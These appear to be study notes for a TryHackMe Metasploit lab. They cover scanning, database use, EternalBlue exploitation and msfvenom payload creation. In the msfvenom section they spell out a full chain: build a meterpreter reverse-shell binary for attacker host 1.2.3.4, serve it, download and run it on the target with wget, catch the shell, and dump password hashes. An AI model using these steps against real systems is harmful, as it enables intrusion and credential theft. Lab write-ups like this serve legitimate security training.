# Room
https://tryhackme.com/room/metasploitexploitation

# Task 1 - Intro
Intro

# Task 2 - Scanning
* port scanning with metasploit console
* launch the console
    * msfconsole
* search for port scan modules
    * search portscan
* use the module
    * use auxilirary/scanner/portscan/tcp
* view and set the options, run the exploit
    * show options
    * set rhosts [target_ip]
    * run
* from within metasploit console you can run commands directly, such as nmap
    * nmap -A -T4 [target_ip]
* useful modules
    * udp_sweep
    * smb_enumshares
    * smb_version
    * smb_login

# Task 3 - metasploit database
* the metasploit database can be used as a way to store information about the engagement and to have multiple shared workspaces when collaborating with others
* install then start postgresql
    * systemctl start postgresql
* initialize the metasploit database
    * msfdb init
* load the console and check the database status
    * msfconsole
    * db_status
* view current workspaces
    * workspace
* create a new workspace
    * workspace -a newworkspace
* switch to a different workspace
    * workspace newworkspace
* view options for the current workspace
    * workspace -h
* run tools within the context of the database so results are saved to it, example for nmap
    * db_nmap -A -T4 [target_ip]
* view results of your tools
    * hosts
    * services
* options available for the results
    * hosts -h
    * services -h
* more than one target, use hosts -R
* to scan specific services, services -S [service_name]

# Task 4 - vulnerability scanning
* metasploit allows vulnerability scanning, the more information you have discovered during the recon process will assist in the vuln checks
* to view detailed information about a module use the info command when you are in the module context

# Task 5 - exploitation
* exploit the vulnerable machine
* recon
    * nmap -A -T4 [target_ip]
* research
    * reviewed scan results, found this was an old Windows 7 machine
    * first thing to check for Windows 7 is eternalblue
* exploit
    * msfconsole
    * search blue
    * set rhosts [target_ip]
    * run
* post-exploit
    * the machine was vulnerable to eternalblue, metasploit was able to exploit it and provide a meterpreter shell
    * from meterpreter you can shell out to the OS using the shell command, from there you can search for the flag
    * to dump hashes you can use hashdump

# Task 6 - msfvenom
* msfvenom allows you to generate payloads from the accessible ones in metasploit framework
* creatable payload formats include
    * php
    * exe
    * dll
    * elf
* target systems include
    * apple
    * windows
    * android
    * linux
* list msfvenom payloads
    * msfvenom -l payloads
* list msfvenom output formats
    * msfvenom --list formats
* to encode a payload use -e
* a handler is a function within metasploit framework to catch your shell
* there are two types of handlers
    * normal payload that launches a normal reverse shell
    * meterpreter payload which launches a meterpreter shell
* payload creation basics
    * msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=1234 -f exe > rev_shell.exe
        * msfvenom -p windows/meterpreter/reverse_tcp - creates a meterpreter reverse tcp payload
        * LHOST - attacker IP
        * LPORT - attacker port to catch the shell via nc, msfconsole, or some other means
        * -f exe - output with format exe
        * > rev_shell.exe - redirect the output to a file called rev_shell.exe that is ready to stage on the victim
* challenge
    * on the target login using the supplied credentials
    * on the target elevate to root: sudo su
    * on the attacking machine create a meterpreter payload using the elf format
        * msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=2222 -f elf > lb
    * on the attacking machine host the exploit
        * python -m http.server 9000
    * on the target download the host exploit using wget
        * wget http://1.2.3.4:9000/lb .
    * on the target set the exploit to be executable
        * chmod +x lb
    * on the attacking machine load msfconsole and start a meterpreter handler to catch the shell
        * msfconsole
        * use multi/handler
        * set payload linux/x86/meterpreter/reverse_tcp
        * set lhost eth0
        * set lport 2222
        * run
    * on the target execute the exploit
        * ./lb
    * on the attacking machine receive the shell
        * meterpreter shell was received
        * use the sysinfo command to get basic information
        * background the session to run through further post exploitation - background
    * in msfconsole list sessions using sessions
    * search for a linux related hash dump module
        * search hash platform:linux
    * enter the hashdump module and dump the hashes from your target
        * use post/linux/gather/hashdump
        * set session 1 (based on output from sessions command)
        * run
    * the post exploit hashdump will run and dump all user hashes

# Task 7 - summary
Summary